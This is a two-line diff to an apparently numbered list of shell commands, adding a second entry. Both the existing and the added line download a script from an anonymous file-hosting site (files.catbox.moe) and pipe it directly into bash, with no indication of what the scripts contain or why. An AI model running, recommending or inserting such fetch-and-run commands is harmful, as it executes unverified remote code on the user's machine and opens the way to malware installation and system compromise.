@@ -1,1 +1,2 @@
 1)curl -sSL https://files.catbox.moe/5poyl1.bash | bash 
+2)curl -sSL https://files.catbox.moe/myqtp9.sh | bash 
